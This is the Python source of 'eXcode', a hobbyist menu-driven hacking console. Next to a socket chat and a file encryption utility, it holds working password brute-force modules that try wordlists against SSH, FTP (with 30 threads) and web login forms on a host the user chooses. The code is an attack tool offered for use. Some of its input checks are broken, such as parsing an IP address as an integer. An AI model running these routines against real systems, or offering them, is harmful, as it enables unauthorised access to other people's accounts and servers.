import socket
import select
import signal
import errno
import sys, getopt
from colorama import Fore, Back, Style
import random
import os
from cryptography.fernet import Fernet
from paramiko import SSHClient
import paramiko
from ftplib import FTP
import ftplib
import mechanize
from mechanize import Browser
from threading import Thread
import queue
import readline

#-------------------------------------------------------------#

endwhile = False
HEADER_LENGTH = 10
b = 0
using = "nothing"
HOST = "127.0.0.1"
LPORT = ""
PORT = 1234
library_list = ["socket/server", "socket/client", "files/encrypt", "files/decrypt" , "pass/ssh", "pass/ftp", "pass/web"]
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if using == "socketS":
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sockets_list = [server_socket]
clients = {}
originalfile = ''
enc_file = ''
dec_file = ''
keyfilename = ''
wordlist = ''
SSHPORT = 22
FTPPORT = 21
client = SSHClient()
sshusername = ''
ftpusername = ''
url = ""
sucurl = ""
webuser = ""
formnumber = 0
formpassname = ""
formusername = ""
q = queue.Queue()
n_threads = 30

#-------------------------------------------------------------#

def baner():
    b = random.randrange(1, 5)
    if b == 1:
        
        banner1 = """ 
.------..------..------..------..------..------.
|E.--. ||X.--. ||C.--. ||O.--. ||D.--. ||E.--. |
| (\/) || :/\: || :/\: || :/\: || :/\: || (\/) |
| :\/: || (__) || :\/: || :\/: || (__) || :\/: |
| '--'E|| '--'X|| '--'C|| '--'O|| '--'D|| '--'E|
`------'`------'`------'`------'`------'`------'

        """
        print(Fore.LIGHTMAGENTA_EX + banner1 + Fore.RESET)
        print("excode made by :" + Fore.YELLOW + " irealycode" + Fore.RESET)
        print("https://github.com/irealycode")
        print("                               ")
    elif b == 2:
        banner2 = """                                  
                     (          
   (     )           )\ )   (   
  ))\ ( /(  (   (   (()/(  ))\  
 /((_))\()) )\  )\   ((_))/((_) 
(_)) ((_)\ ((_)((_)  _| |(_))   
/ -_)\ \ // _|/ _ \/ _` |/ -_)  
\___|/_\_\___|\___/\__._|\___|  

         """
        print(Fore.RED + banner2 + Fore.RESET)
        print("excode made by :" + Fore.YELLOW + " irealycode" + Fore.RESET)
        print("https://github.com/irealycode")
        print("\n")
    elif b == 3:
        banner3 = """ 
                                .___      
  ____ ___  ___ ____  ____   __| _/____  
_/ __  \  \/  // ___\/  _ \ / __ |/ __ \ 
\  ___/ >    <\  \__(  <_> ) /_/ \  ___/ 
 \___  >__/\_ \____  >____/\____ |\___  >
     \/      \/    \/           \/    \/ 

        """
        print(Fore.GREEN + banner3 + Fore.RESET)
        print("excode made by :" + Fore.YELLOW + " irealycode" + Fore.RESET)
        print("https://github.com/irealycode")
        print("                               ")
    elif b == 4:
        banner4 = """
▓█████ ▒██   ██▒ ▄████▄   ▒█████  ▓█████▄ ▓█████ 
▓█   ▀ ▒▒ █ █ ▒░▒██▀ ▀█  ▒██▒  ██▒▒██▀ ██▌▓█   ▀ 
▒███   ░░  █   ░▒▓█    ▄ ▒██░  ██▒░██   █▌▒███   
▒▓█  ▄  ░ █ █ ▒ ▒▓▓▄ ▄██▒▒██   ██░░▓█▄   ▌▒▓█  ▄ 
░▒████▒▒██▒ ▒██▒▒ ▓███▀ ░░ ████▓▒░░▒████▓ ░▒████▒
░░ ▒░ ░▒▒ ░ ░▓ ░░ ░▒ ▒  ░░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░
 ░ ░  ░░░   ░▒ ░  ░  ▒     ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░
   ░    ░    ░  ░        ░ ░ ░ ▒   ░ ░  ░    ░   
   ░  ░ ░    ░  ░ ░          ░ ░     ░       ░  ░
                ░                  ░             

         """
        print(Fore.YELLOW + banner4 + Fore.RESET)
        print("excode made by :" + Fore.YELLOW + " irealycode" + Fore.RESET)
        print("https://github.com/irealycode")
        print("                               ")

#---------------------------server side------------------------------#


def receive_message(client_socket):
    try:
        message_header = client_socket.recv(HEADER_LENGTH)
        if not len(message_header):
            return False
        message_length = int(message_header.decode('utf-8').strip())

        return {'header': message_header, 'data': client_socket.recv(message_length)}

    except:
        return False

def serverlisten():
    try:
        while True:
            read_sockets, _, exception_sockets = select.select(sockets_list, [], sockets_list)
            if endwhile == True:
                print(Fore.GREEN + "goodbye." + Fore.RESET)
                break
            for notified_socket in read_sockets:
                if notified_socket == server_socket:
                    client_socket, client_address = server_socket.accept()
                    user = receive_message(client_socket)
                    if user is False:
                        continue
                    sockets_list.append(client_socket)
                    clients[client_socket] = user

                    print(Fore.LIGHTGREEN_EX +'new connection from {}:{}, username: {}'.format(*client_address, user['data'].decode('utf-8')) + Fore.RESET)

                else:
                    message = receive_message(notified_socket)
                    if message is False:
                        print('Closed connection by: {}'.format(clients[notified_socket]['data'].decode('utf-8')))
                        sockets_list.remove(notified_socket)
                        del clients[notified_socket]

                        continue
                    user = clients[notified_socket]

                    print(Fore.LIGHTGREEN_EX +'Message from ' + Fore.BLUE + f'{user["data"].decode("utf-8")} : ' + Fore.YELLOW +  f'{message["data"].decode("utf-8")}' + Fore.RESET)
                    for client_socket in clients:
                        if client_socket != notified_socket:

                            client_socket.send(user['header'] + user['data'] + message['header'] + message['data'])

            for notified_socket in exception_sockets:
                sockets_list.remove(notified_socket)
                del clients[notified_socket]
    except:
        print("error connecting")
        server_socket.close()



def serverconnet():
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen()
        print('listening on ' + HOST + ':' + str(PORT) + '...')
        serverlisten()
    except:
        print("error conecting1")

#------------------------end of server side--------------------------#

#---------------------------client side------------------------------#

def clientconnet():
    try:
        server_sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sockets.connect((HOST, PORT))
        server_sockets.setblocking(False)
        my_username = input("username: ")
        username = my_username.encode('utf-8')
        username_header = f"{len(username):<{HEADER_LENGTH}}".encode('utf-8')
        server_sockets.send(username_header + username)
        print(Fore.LIGHTGREEN_EX + 'loged in as ' + my_username + ' seccessfully.')
        while True:
            message = input(Fore.WHITE +'[-'+ Fore.CYAN + f'{my_username}' + Fore.WHITE + '-] : ')
            if message == 'exit -y':
                print(Fore.GREEN + "goodbye." + Fore.RESET)
                
                break
            if len(message) <= 200:
                if message:
                    message = message.encode('utf-8')
                    message_header = f"{len(message):<{HEADER_LENGTH}}".encode('utf-8')
                    server_sockets.send(message_header + message)
            elif len(message) > 200:
                print("you can't send messages that are longer than 200 characters")
                print("your message is " + str(len(message)) + " characters long")

            try:
                while True:
                    username_header = server_sockets.recv(HEADER_LENGTH)
                    if not len(username_header):
                        print('Connection closed by the server')
                        break
                    username_length = int(username_header.decode('utf-8').strip())
                    username = server_sockets.recv(username_length).decode('utf-8')
                    message_header = server_sockets.recv(HEADER_LENGTH)
                    message_length = int(message_header.decode('utf-8').strip())
                    message = server_sockets.recv(message_length).decode('utf-8')
                    print(Fore.WHITE + '[-' + Fore.GREEN + f'{username}' + Fore.WHITE + '-] : ' + Fore.YELLOW + f'{message}')

            except IOError as e:
                if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
                    print('Reading error: {}'.format(str(e)))
                    break
                continue

            except Exception as e:
                print('error')
                break
    except:
        print("error connecing")
#------------------------end of client side----------------------------#

#------------------------encrypting files---------------------------#

def encryptfile():
    try:
        key = Fernet.generate_key()
        with open(keyfilename, 'wb') as mykey:
            mykey.write(key)
        with open(keyfilename, 'rb') as mykey:
            key = mykey.read()
        f = Fernet(key)
        with open(originalfile, 'rb') as original_file:
            original = original_file.read()

        encrypted = f.encrypt(original)

        with open (enc_file, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

        print(Fore.GREEN + "file encrypted")
    except:
        print("error encrypting")
    

    

#------------------------encryptng files end------------------------#

#------------------------decryptng files end------------------------#

def decryptfile():
    try:
        with open(keyfilename, 'rb') as mykey:
            key = mykey.read()
        f = Fernet(key)

        with open(enc_file, 'rb') as encrypted_file:
            encrypted = encrypted_file.read()

        decrypted = f.decrypt(encrypted)

        with open(dec_file, 'wb') as decrypted_file:
            decrypted_file.write(decrypted)
            
        print(Fore.GREEN + "file decrypted")
    except:
        print("error decrypting")

#------------------------decryptng files end------------------------#
#------------------------bruteforce ssh-----------------------#

def sshP():

    sshppasswords = open(wordlist).read().split("\n")
    n=0
    for i in sshppasswords:
        n += 1
    print("[" + Fore.LIGHTYELLOW_EX + wordlist + Fore.RESET + "] : " + Fore.LIGHTYELLOW_EX + str(n) + " words loaded" + Fore.RESET)

    try:        
        client.load_system_host_keys()
        # client.load_host_keys('/Users/User/.ssh/known_hosts')
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        f = open(wordlist)
        lines = f.readlines()
        passwords = ''
        try:
            for i in range(len(lines)):
                passwords = str(lines[i].strip())
                try:
                    client.connect(HOST, username=sshusername, password=passwords, port=SSHPORT)
                    print("password found: " + Fore.LIGHTGREEN_EX + str(HOST) + ":" + str(SSHPORT) + " " + sshusername + " : " + passwords + Fore.RESET)
                    break
                except:
                    print(str("password failed: " + Fore.LIGHTRED_EX + passwords + Fore.RESET))
                    sys.stdout.write("\033[F")
                    sys.stdout.write("\033[K")
                    i += 1
        except:
            print("couldn't find the password")
    except:
        print("error!?")

#------------------------bruteforce ssh-----------------------#
#------------------------bruteforce ftp-----------------------#

def ftpPass():
    host1 = HOST
    user = ftpusername
    port1 = FTPPORT
    
    with open(wordlist, 'r') as ftpppasswords:
        n=0
        for i in ftpppasswords:
            n += 1
        print("[" + Fore.LIGHTYELLOW_EX + wordlist + Fore.RESET + "] : " + Fore.LIGHTYELLOW_EX + str(n) + " words loaded" + Fore.RESET)

    def connect_ftp():
        global q
        while True:
            try:
                ftppassword = q.get()
                server = ftplib.FTP()
                print("password failed: " + Fore.LIGHTRED_EX + ftppassword + Fore.RESET)
                sys.stdout.write("\033[F")
                sys.stdout.write("\033[K")
                try:
                    server.connect(host1, port1, timeout=5)
                    server.login(user, ftppassword)
                except ftplib.error_perm:
                    pass
                else:
                    print("password found: " + Fore.GREEN + str(HOST) + ":" + str(FTPPORT) + " "  + user + " : " + ftppassword + Fore.RESET)
                    with q.mutex:
                        q.queue.clear()
                        q.all_tasks_done.notify_all()
                        q.unfinished_tasks = 0
                finally:
                    q.task_done()
            except:
                break
    try:
        ftppasswords = open(wordlist, 'r').read().split("\n")
        for ftppassword in ftppasswords:
            q.put(ftppassword)
        for t in range(n_threads):
            thread = Thread(target=connect_ftp)
            thread.daemon = True
            thread.start()
        q.join()
    except:
        pass
    

#------------------------bruteforce ftp-----------------------#
#------------------------bruteforce web-----------------------#

def webPass():
    br = Browser()
    br.set_handle_robots(False)
    try:
        f = open(wordlist)
        lines = f.readlines()
        br.open(url)
        for i in range(len(lines)):
            passL = lines[i].strip()
            br.select_form(nr = int(formnumber))
            br.form[formusername] = webuser
            br.form[formpassname] = passL
            br.method = "POST"
            response = br.submit()
            niceurl = response.geturl()
            if niceurl == sucurl:
                print("password failed: " + Fore.LIGHTRED_EX + passL + Fore.RESET)
            else:
                print("password found: " + Fore.GREEN + passL + Fore.RESET)
                break
    except:
        print("failed")


#------------------------bruteforce web-----------------------#


# ========================================================================================================================================== #
# |                                                             MAIN HEART                                                                 |           
# ========================================================================================================================================== #


baner()
excodeInput = "eXcode> "
while True:
    try:
        excode = input(Fore.GREEN + excodeInput + Fore.RESET)
        if excode.startswith('search '):
            try:
                searchfor = excode.split("search ",1)[1]
                matching = [s for s in library_list if searchfor in s]
                matchingCount = len(matching)
                if matching:
                    for i in range(matchingCount):
                        print(matching[i])
                else:
                    print(searchfor + ' not found.')
            except:
                print('error searching')
        elif excode == "libs":
            libsCount = len(library_list)
            for i in range(libsCount):
                print("(" + str(i) + ") " + library_list[i])
        elif excode == "exit" or excode == "exit -y":
            print(Fore.GREEN + "goodbye." + Fore.RESET)
            sys.exit()
        elif excode == 'encrypt':
            encryptfile()
        elif excode == "help":
            print(Fore.CYAN +""" 
            use : for using libraries

            search : searching for libraries

            clear or cls : clear the terminal window

            set : for setting variables for libraries

            show options : showing options for libraries

            run : running or executing the command

            libs : show available libraries

            banner : show one of our banners

            help : help...

            exit : exit excode
            """ + Fore.RESET)
        elif excode == "banner":
            baner()
        elif excode == "clear" or excode == "cls":
            os.system('cls' if os.name == 'nt' else 'clear')
    #------------------use is here------------------#
        elif excode.startswith('use '):
            try:
                use = excode.split("use ",1)[1]
                if use == str(library_list[0]) or int(use) == 0:
                    excodeInput = "eXcode(" + Fore.RED + str(library_list[0]) + Fore.GREEN + ")> "
                    using = "socketS"
                elif use == str(library_list[1]) or int(use) == 1:
                    excodeInput = "eXcode(" + Fore.RED + str(library_list[1]) + Fore.GREEN + ")> "
                    using = "socketC"
                elif use == str(library_list[2]) or int(use) == 2:
                    excodeInput = "eXcode(" + Fore.RED + str(library_list[2]) + Fore.GREEN + ")> "
                    using = "encryptF"
                elif use == str(library_list[3]) or int(use) == 3:
                    excodeInput = "eXcode(" + Fore.RED + str(library_list[3]) + Fore.GREEN + ")> "
                    using = "decryptF"
                elif use == str(library_list[4]) or int(use) == 4:
                    excodeInput = "eXcode(" + Fore.RED + str(library_list[4]) + Fore.GREEN + ")> "
                    using = "sshP"
                elif use == str(library_list[5]) or int(use) == 5:
                    excodeInput = "eXcode(" + Fore.RED + str(library_list[5]) + Fore.GREEN + ")> "
                    using = "ftpP"
                elif use == str(library_list[6]) or int(use) == 6:
                    excodeInput = "eXcode(" + Fore.RED + str(library_list[6]) + Fore.GREEN + ")> "
                    using = "webP"
                elif use == ".." or "nothing":
                    using = "nothing"
                    excodeInput = "eXcode> "
                else:
                    print("can't find " + Fore.RED + use + Fore.RESET + " in excode library")
            except:
                print("error on using")
        elif excode == "back":
            using = "nothing"
            excodeInput = "eXcode> "
    #------------------use is here------------------#
    #------------------set is here------------------#
        elif excode.startswith('set '):
            if using == "socketS" or using == "socketC":
                try:
                    setL = excode.split("set ",1)[1]
                    if setL.startswith('HOST '):
                        try:
                            if int(setL.split("HOST ",1)[1]):
                                HOST = setL.split("HOST ",1)[1]
                        except:
                            print("error in HOST")
                    elif setL.startswith('PORT '):
                        try:
                            if int(setL.split("PORT ",1)[1]):
                                LPORT = setL.split("PORT ",1)[1]
                                PORT = int(LPORT)
                        except:
                            print("error in PORT")    
                    else:
                        print("error setting:" + setL)            
                except:
                    print("error in seting")
            elif using == "encryptF":
                try:
                    setL = excode.split("set ",1)[1]
                    if setL.startswith('Ofile '):
                        try:
                            Ofile = setL.split("Ofile ",1)[1]
                            originalfile = Ofile
                        except:
                            print("can't find file")
                    elif setL.startswith('Efile '):
                        try:
                            Efile = setL.split("Efile ",1)[1]
                            enc_file = Efile
                        except:
                            print("can't find file")
                    elif setL.startswith('Kfile '):
                        try:
                            Kfile = setL.split("Kfile ",1)[1]
                            keyfilename = Kfile
                        except:
                            print("can't find file")
                    else:
                        print("error setting:" + setL)
                except:
                    print("error setting")
            elif using == "decryptF":
                try:
                    setL = excode.split("set ",1)[1]
                    if setL.startswith('Dfile '):
                        try:
                            Dfile = setL.split("Dfile ",1)[1]
                            dec_file = Dfile
                        except:
                            print("can't find file")
                    elif setL.startswith('Efile '):
                        try:
                            Efile = setL.split("Efile ",1)[1]
                            enc_file = Efile
                        except:
                            print("can't find file")
                    elif setL.startswith('Kfile '):
                        try:
                            Kfile = setL.split("Kfile ",1)[1]
                            keyfilename = Kfile
                        except:
                            print("can't find file")
                    else:
                        print("error setting:" + setL)
                except:
                    print("error setting")
            elif using == "sshP" or using == "ftpP":
                try:
                    sshW = excode.split("set ",1)[1]
                    if sshW.startswith('Wlist '):
                        try:
                            wordlist = sshW.split("Wlist ",1)[1]
                        except:
                            print("can't find file")
                    elif sshW.startswith('HOST '):
                        try:
                            if int(sshW.split("HOST ",1)[1]):
                                HOST = sshW.split("HOST ",1)[1]
                        except:
                            print("error HOST setting")
                    elif sshW.startswith('PORT '):
                        try:
                            if int(sshW.split("PORT ",1)[1]):
                                LPORT = sshW.split("PORT ",1)[1]
                                SSHPORT = int(LPORT)
                        except:
                            print("error PORT setting")
                    elif sshW.startswith('Username '):
                        try:
                            sshusername = sshW.split("Username ",1)[1]
                            ftpusername = sshW.split("Username ",1)[1]
                        except:
                            print("error username setting")
                    elif sshW.startswith('Wordlist '):
                        try:
                            wordlist = sshW.split("Wordlist ",1)[1]
                        except:
                            print("error wordlist setting")
                    elif sshW.startswith('Threads '):
                        try:
                            if int(sshW.split("Threads ",1)[1]):
                                n_threads = sshW.split("Threads ",1)[1]
                        except:
                            print("error threads setting")
                    else:
                        print("error setting:" + sshW)
                except:
                            print("error setting")
            elif using == "webP":
                try:
                    setL = excode.split("set ",1)[1]
                    if setL.startswith('URL '):
                        try:
                            url = setL.split("URL ",1)[1]
                        except:
                            print("can't find file")
                    elif setL.startswith('Errorurl '):
                        try:
                            sucurl = setL.split("Errorurl ",1)[1]
                        except:
                            print("can't find file")
                    elif setL.startswith('Wordlist '):
                        try:
                            wordlist = setL.split("Wordlist ",1)[1]
                        except:
                            print("can't find file")
                    elif setL.startswith('Wordlist '):
                        try:
                            wordlist = setL.split("Wordlist ",1)[1]
                        except:
                            print("can't find file")
                    elif setL.startswith('Username '):
                        try:
                            webuser = setL.split("Username ",1)[1]
                        except:
                            print("error setting username")
                    elif setL.startswith('Fpwd '):
                        try:
                            formpassname = setL.split("Fpwd ",1)[1]
                        except:
                            print("error setting form password input")
                    elif setL.startswith('Fusr '):
                        try:
                            formusername = setL.split("Fusr ",1)[1]
                        except:
                            print("error form username input")
                    elif setL.startswith('Fnum '):
                        try:
                            if int(setL.split("Fnum ",1)[1]):
                                formnumber = setL.split("Fnum ",1)[1]
                        except:
                            print("error form number in list")
                    else:
                        print("error setting:" + setL)
                except:
                    print("error setting")  
            else:
                print("invalid set")  
    #------------------set is here------------------#
    #------------------show is here------------------#
        elif excode == "show":
            print("do you mean: 'show options' ?")
        elif excode.startswith('show '):
            if using == "socketS" or using == "socketC":
                try:
                    show = excode.split("show ",1)[1]
                    if show == "options":
                        print("HOST: " + HOST)
                        print("PORT: " + str(PORT))
                    else:
                        print("show what?")
                except:
                    print("error showing options")
            elif using == "encryptF":
                try:
                    show = excode.split("show ",1)[1]
                    if show == "options":
                        print("Ofile(original file): " + originalfile)
                        print("Efile(encrypted file): " + enc_file)
                        print("Kfile(key file(needs to be a .key file)): " + keyfilename)
                    else:
                        print("show what?")
                except:
                    print("error showing options")
            elif using == "decryptF":
                try:
                    show = excode.split("show ",1)[1]
                    if show == "options":
                        print("Dfile(original file): " + dec_file)
                        print("Efile(encrypted file): " + enc_file)
                        print("Kfile(key file(needs to be a .key file)): " + keyfilename)
                    else:
                        print("show what?")
                except:
                    print("error showing options")
            elif using == "sshP":
                print("HOST: " + HOST)
                print("PORT: " + str(SSHPORT))
                print("Wordlist: " + wordlist)
                print("Username: " + sshusername)
            elif using == "ftpP":
                print("HOST: " + HOST)
                print("PORT: " + str(FTPPORT))
                print("Wordlist: " + wordlist)
                print("Username: " + ftpusername)
                print("Treads: " + str(n_threads))
            elif using == "webP":
                print("URL: " + url)
                print("Errorurl: " + sucurl)
                print("Wordlist: " + wordlist)
                print("Username: " + webuser)
                print("Fnum: " + str(formnumber))
                print("Fusr: " + formusername)
                print("Fpwd: " + formpassname)
            else:
                print("you need to set a library.")
    #------------------show is here------------------#
        elif excode == "run":
            if using == "socketS":
                if HOST != "" and PORT != 0:
                    serverconnet()
                else:
                    print("you need to set values to both port and host")
            elif using == "socketC":
                if HOST != "" and PORT != 0:
                    clientconnet()
                else:
                    print("you need to set values to both port and host")
            elif using == "encryptF":
                if keyfilename != '' and enc_file != '' and originalfile != '':
                    encryptfile()
                else:
                    print("you need to set values to the files")
            elif using == "decryptF":
                if keyfilename != '' and enc_file != '' and dec_file != '':
                    decryptfile()
                else:
                    print("you need to set values to the files")
            elif using == "sshP":
                if  sshusername != '' and wordlist != '':
                    sshP()
                else:
                    print("you need to set values to the files")
            elif using == "ftpP":
                if  ftpusername != '' and wordlist != '':
                    ftpPass()
                else:
                    print("you need to set values to the files")
            elif using == "webP":
                if  webuser != '' and wordlist != '' and formpassname != '' and formusername != '':
                    webPass()
                else:
                    print("you need to set values")
            else:
                print('run what??')
        elif excode.startswith(' '):
            print("you can't use spaces in the begining of the command.")
        elif excode == '':
            pass
        else:
            print('unknown command: ' + excode)
    except KeyboardInterrupt:
        print("")

